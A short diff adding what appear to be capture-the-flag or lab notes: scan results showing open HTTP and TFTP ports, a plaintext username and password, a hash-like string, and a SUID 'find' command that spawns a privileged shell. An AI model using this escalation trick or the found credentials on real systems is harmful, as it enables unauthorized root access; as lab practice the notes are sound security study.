@@ -1,0 +1,13 @@
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+69/udp open|filtered tftp
+
+john:thisisagoodpassword
+f54846c258f3b4612f78a819573d158e
+
+
+/usr/bin/find . -exec /bin/sh -p \; -quit
